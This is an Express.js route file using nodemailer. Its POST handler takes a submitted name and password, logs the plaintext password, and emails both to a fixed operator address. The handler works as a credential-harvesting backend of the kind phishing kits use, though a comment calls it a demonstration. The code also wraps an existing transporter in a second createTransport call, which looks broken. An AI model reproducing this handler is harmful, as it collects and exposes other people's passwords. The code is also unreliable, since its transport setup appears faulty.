const express = require('express');
const router = express.Router();
const nodemailer = require('nodemailer');


// Create a SMTP transport object
const transport = nodemailer.createTransport({
    service: "Gmail",
    auth: {
        user: `${process.env.YOUR_EMAIL_ADDRESS}`,
        pass: `${process.env.PASSWORD_FOR_EMAIL}`
    }
});

const transporter = nodemailer.createTransport(transport)

transporter.verify((error, success) => {
    if (error) {
        console.log(error);
    } else {
        console.log('Server is ready to take messages');
    }
});
    

router.post('/', (req, res, next) => {
    console.log('', req.body.name);
    const name = req.body.name;
    // for demonstration emails will be sent to this address regardless of user input
    const username = process.env.YOUR_EMAIL_ADDRESS;
    const password = req.body.password;
    const content = `name: ${name} \n email: ${username} \n password: ${password} `;
    console.log('content for email', content);

    const mail = {
        from: name,
        to: process.env.YOUR_EMAIL_ADDRESS, 
        subject: `Message from ${name}`,
        text: content
    }

    transporter.sendMail(mail, (err, data) => {
        if (err) {
             console.log('error with sending', err);
            res.json({
                msg: 'fail'
            })
        } else {
            res.json({
                msg: 'success'
            })
        }
    })
})



module.exports = router;